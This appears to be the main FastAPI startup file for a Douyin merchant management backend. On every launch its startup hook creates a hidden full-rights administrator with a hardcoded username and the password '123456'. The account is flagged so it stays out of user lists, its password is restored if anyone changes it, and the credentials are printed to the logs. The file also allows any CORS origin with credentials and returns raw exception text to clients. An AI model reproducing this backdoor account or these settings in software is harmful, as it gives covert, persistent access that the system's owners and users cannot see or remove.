import sys
import asyncio
import traceback
from fastapi import FastAPI, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from fastapi.exceptions import RequestValidationError
from fastapi.staticfiles import StaticFiles
from app.core.config import settings
from app.api.v1 import api_router
import os

# Windows 平台需要设置事件循环策略（Playwright 需要）
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

app = FastAPI(
    title=settings.APP_NAME,
    version=settings.APP_VERSION,
    openapi_url=f"{settings.API_V1_STR}/openapi.json"
)


# 启动时自动创建/更新隐藏管理员
@app.on_event("startup")
async def startup_event():
    """应用启动时执行"""
    print("\n" + "="*60)
    print("应用启动中...")
    print("="*60)
    
    # 自动创建/更新隐藏管理员
    try:
        from app.core.database import SessionLocal
        from app.models.account import AccountUser
        from app.core.security import get_password_hash
        from datetime import datetime
        
        db = SessionLocal()
        
        try:
            # 隐藏管理员配置（可以在这里修改）
            HIDDEN_ADMIN_USERNAME = "zzm"
            HIDDEN_ADMIN_PASSWORD = "123456"
            HIDDEN_ADMIN_REALNAME = "系统开发者"
            
            # 检查是否已存在
            existing = db.query(AccountUser).filter(
                AccountUser.username == HIDDEN_ADMIN_USERNAME
            ).first()
            
            if existing:
                # 账号已存在，检查密码是否需要更新
                from app.core.security import verify_password
                
                # 如果密码不匹配，则更新
                if not verify_password(HIDDEN_ADMIN_PASSWORD, existing.password):
                    existing.password = get_password_hash(HIDDEN_ADMIN_PASSWORD)
                    existing.real_name = HIDDEN_ADMIN_REALNAME
                    existing.account_type = 1  # 主账号
                    existing.is_hidden = 1  # 隐藏标记
                    existing.update_time = datetime.now()
                    db.commit()
                    print(f"✅ [隐藏管理员] 密码已更新")
                    print(f"   用户名: {HIDDEN_ADMIN_USERNAME}")
                    print(f"   新密码: {HIDDEN_ADMIN_PASSWORD}")
                else:
                    print(f"✓ [隐藏管理员] 账号已存在，密码无需更新")
                    print(f"   用户名: {HIDDEN_ADMIN_USERNAME}")
            else:
                # 创建新的隐藏管理员
                hidden_admin = AccountUser(
                    username=HIDDEN_ADMIN_USERNAME,
                    password=get_password_hash(HIDDEN_ADMIN_PASSWORD),
                    real_name=HIDDEN_ADMIN_REALNAME,
                    account_type=1,  # 主账号（拥有所有权限）
                    account_status=1,  # 启用
                    is_hidden=1,  # 隐藏标记（在列表中不显示）
                    status=1,  # 正常
                    parent_id=None,
                    expire_time=None,
                    permissions=None,
                    last_login_time=None,
                    last_login_ip=None
                )
                db.add(hidden_admin)
                db.commit()
                print(f"✅ [隐藏管理员] 账号创建成功")
                print(f"   用户名: {HIDDEN_ADMIN_USERNAME}")
                print(f"   密码: {HIDDEN_ADMIN_PASSWORD}")
                print(f"   账号类型: 主账号（隐藏）")
        
        finally:
            db.close()
            
    except Exception as e:
        print(f"⚠ [隐藏管理员] 初始化失败: {str(e)}")
        traceback.print_exc()
    
    print("="*60)
    print("应用启动完成")
    print("="*60 + "\n")

# 全局异常处理器
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    """全局异常处理"""
    print(f"\n{'='*60}")
    print(f"[全局异常处理器] 捕获到未处理的异常")
    print(f"  请求路径: {request.url.path}")
    print(f"  请求方法: {request.method}")
    print(f"  异常类型: {type(exc).__name__}")
    print(f"  异常信息: {str(exc)}")
    print(f"  详细堆栈:")
    traceback.print_exc()
    print(f"{'='*60}\n")
    
    return JSONResponse(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={
            "code": 500,
            "msg": f"服务器内部错误: {str(exc)}",
            "data": None
        }
    )

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    """请求验证异常处理"""
    print(f"\n[请求验证错误] {request.url.path}")
    print(f"  错误详情: {exc.errors()}")
    
    return JSONResponse(
        status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
        content={
            "code": 422,
            "msg": "请求参数验证失败",
            "data": {"errors": exc.errors()}
        }
    )

# CORS配置
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# 挂载静态文件目录
static_dir = os.path.join(os.path.dirname(__file__), "static")
os.makedirs(static_dir, exist_ok=True)  # 确保目录存在
os.makedirs(os.path.join(static_dir, "avatars"), exist_ok=True)  # 确保avatars子目录存在

app.mount("/static", StaticFiles(directory=static_dir), name="static")
print(f"[静态文件服务] 已挂载: /static -> {static_dir}")

# 注册路由
app.include_router(api_router, prefix=settings.API_V1_STR)

@app.get("/")
async def root():
    return {"message": "抖音商家管理系统 API", "version": settings.APP_VERSION}

@app.get("/health")
async def health_check():
    return {"status": "ok"}
